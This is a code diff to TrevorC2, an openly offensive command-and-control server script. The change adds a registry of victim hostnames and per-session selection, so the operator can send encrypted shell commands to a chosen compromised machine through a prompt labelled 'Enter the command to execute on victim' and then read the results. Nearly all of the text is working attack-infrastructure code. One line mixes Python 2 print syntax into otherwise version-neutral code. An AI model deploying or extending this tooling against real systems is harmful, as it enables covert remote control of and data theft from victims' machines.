@@ -64,12 +64,22 @@ logging.basicConfig(level=logging.CRITICAL, format='[%(asctime)s] %(message)s', 
 log = logging.getLogger(__name__)
 
 __author__ = 'Dave Kennedy (@HackingDave)'
-__version__ = 0.5
+__version__ = 0.6
 
 # ROOT CHECK
 if os.geteuid() != 0:
     print("\n[!] TrevorC2 needs to be run as root (web socket binding, etc.)... Re-run TrevorC2 as sudo/root in order to run.")
     sys.exit()
+
+# python 2/3 compatibility
+try: input = raw_input
+except NameError: pass
+
+# used for registering assets
+assets = []
+def register_assets(hostname):
+    global assets
+    assets.append(hostname)
 
 # AESCipher Library Python2/3 support - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
 class AESCipher(object):
@@ -199,15 +209,24 @@ class SPQ(tornado.web.RequestHandler):
                 query = args[param][0]
         if not query:
             return
-
         query = base64.b64decode(query)
         query_output = cipher.decrypt(query)
-        with open("clone_site/received.txt", "w") as fh:
-            fh.write('=-=-=-=-=-=-=-=-=-=-=\n(CLIENT: {})\n{}'.format(remote_ip, str(query_output)))
 
-        with open("clone_site/instructions.txt", "w") as fh:
-            no_instructions = cipher.encrypt("nothing".encode())
-            fh.write(no_instructions)
+        # register hostnames
+        if "magic_hostname=" in query_output:
+            hostname = query_output.split("=")[1]
+            register_assets(hostname + ":" + remote_ip)
+            print("\n*** Received connection from {} and hostname {} for TrevorC2.".format(remote_ip, hostname))
+
+        else:
+            hostname = query_output.split("::::")[0]
+            data = query_output.split("::::")[1]
+            with open("clone_site/received.txt", "w") as fh:
+                fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
+
+            with open("clone_site/instructions.txt", "w") as fh:
+                no_instructions = cipher.encrypt("nothing".encode())
+                fh.write(no_instructions)
 
 def main_c2():
     """Start C2 Server."""
@@ -295,26 +314,42 @@ if __name__ == "__main__":
     print("[*] Client uses random intervals, this may take a few.")
     try:
         while 1:
-            if PYTHONVER == 2:
-                task = raw_input("Enter the command to execute on victim: ")
-            elif PYTHONVER == 3:
-                task = input("Enter the command to execute on the victim: ")
-            else:
-                sys.exit("Not sure I support this version of Python.")
-            task_out = cipher.encrypt(task.encode())
-            with open("clone_site/instructions.txt", "w") as fh:
-                fh.write(task_out)
-            print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
+            task = input("Enter the command to execute on victim: ")
             while 1:
-                # we received a hit with our command
-                if os.path.isfile("clone_site/received.txt"):
-                    data = open("clone_site/received.txt", "r").read()
-                    print("[*] Received response back from client...")
-                    print(data)
-                    # remove this so we don't use it anymore
-                    os.remove("clone_site/received.txt")
-                    break
-                time.sleep(.3)
+                if task == "":
+                    task = input("Enter the command to execute on victim: ")
+                if task != "": break
+
+            if assets != []:
+                counter = 0 
+                print("*** Select which assets to interact with to execute the command ***\n")
+                for asset in assets:
+                    counter = counter + 1
+                    print str(counter) + ". " + asset + " (TrevorC2 Established)" 
+
+                print("\n")
+                hostname_select = input("Enter the session number to interact with: ")
+                hostname_select = int(hostname_select) - 1
+                hostname = assets[hostname_select]
+                hostname = hostname.split(":")[0]
+                task = (hostname + "::::" + task)
+                task_out = cipher.encrypt(task.encode())
+                with open("clone_site/instructions.txt", "w") as fh:
+                    fh.write(task_out)
+                print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
+                while 1:
+                    # we received a hit with our command
+                    if os.path.isfile("clone_site/received.txt"):
+                        data = open("clone_site/received.txt", "r").read()
+                        print("[*] Received response back from client...")
+                        print(data)
+                        # remove this so we don't use it anymore
+                        os.remove("clone_site/received.txt")
+                        break
+                    time.sleep(.3)
+
+            else:
+                print("[!] No sessions have been established to execute commands.")
 
     # cleanup when using keyboardinterrupt
     except KeyboardInterrupt:
